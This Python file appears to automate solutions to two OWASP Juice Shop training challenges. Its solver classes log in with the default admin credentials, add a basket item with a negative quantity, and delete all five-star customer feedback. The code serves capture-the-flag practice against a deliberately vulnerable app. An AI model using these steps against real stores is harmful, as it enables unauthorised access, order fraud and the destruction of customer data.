from core.base_solver import BaseSolver
from loguru import logger

class PaybackTimeSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "negativeOrderChallenge"

    def solve(self) -> bool:
        # 1. Login to get a basket
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        data = login_res.json().get("authentication", {})
        bid = data.get("bid")
        token = data.get("token")
        
        if not bid or not token: return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Add product with negative quantity
        payload = {
            "ProductId": 1,
            "BasketId": str(bid),
            "quantity": -100
        }
        res = self.client.post("/api/BasketItems", json=payload, headers=headers)
        return res.status_code == 200 or res.status_code == 201

class FiveStarFeedbackSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "feedbackChallenge"

    def solve(self) -> bool:
        # 1. Login as admin
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Get all feedbacks
        res = self.client.get("/api/Feedbacks")
        if res.status_code == 200:
            feedbacks = res.json().get("data", [])
            for f in feedbacks:
                if f.get("rating") == 5:
                    fid = f.get("id")
                    self.client.delete(f"/api/Feedbacks/{fid}", headers=headers)
            return True
        return False
